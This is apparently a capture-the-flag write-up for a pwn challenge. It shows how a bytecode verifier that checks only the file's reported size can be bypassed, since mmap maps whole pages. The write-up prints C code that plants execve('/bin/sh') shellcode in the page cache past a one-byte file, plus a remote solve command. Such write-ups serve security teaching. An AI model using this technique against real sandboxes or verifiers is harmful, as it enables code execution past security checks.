# Secure Bytecode Executor

**Category:** pwn  **Author:** Solvz

> We've built a secure bytecode execution environment. Submit a custom compiler and input file, and we'll execute the generated bytecode after strict verification.
>
> Only safe instructions are allowed. Can you read the flag?

Players got `local/` (the `main` binary plus a short protocol note). Server side is in `deploy/`: `cd deploy && docker compose up --build` (needs `SYS_ADMIN`, it builds user namespaces). `src/build.sh` rebuilds `main` from source.

## Solution

The service takes two files: a "compiler" binary and an input file. It runs the compiler inside a fresh user/mount/pid namespace, chrooted into a per-session workspace, as `./transformer input_code output`. Then it opens `output`, `fstat`s it, `mmap`s it `PROT_READ|PROT_EXEC`, runs it through `verify_bytecode()` and calls it.

The verifier is strict: a handful of register-to-register opcodes, no jumps, no syscalls, no `rsp`/`rip` memory operands. Nothing useful gets past the opcode table itself, so the bug has to be somewhere else.

It's in how much gets checked versus how much gets executed. The verifier only looks at `st_size` bytes. `mmap` works in pages. From mmap(2):

> On Linux, when you write data to such partial page after the end of the object, the data stays in the page cache even after the file is closed and unmapped [...] subsequent mappings may see the modified content.

So the compiler writes a 1 byte file containing `0x90`, maps it `MAP_SHARED` and writes shellcode just past the end of the file into the same page, then exits. The server maps the file again, the verifier happily approves a single `nop`, and execution slides right into the shellcode that's still sitting in the page cache.

```c
fd = open("output", O_CREAT | O_WRONLY, 0777);
write(fd, "\x90", 1);
close(fd);
sleep(3);
fd = open("output", O_RDWR);
uint8_t *m = mmap(NULL, 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
memcpy(&m[1], SHELLCODE, sizeof(SHELLCODE));   /* execve("/bin/sh") */
exit(0);
```

The compiler has to be static since it runs in an empty chroot (`solution/compiler/compile.sh`). Then:

```
cd solution
python3 solve.py --remote --host <host> --port <port>
$ cat flag.txt
```

Flag is per-instance: `H7CTF{m3m0ry_m4pp1ng_bug5_4r3_tr1cky_70_f1nd_<uuid>}`
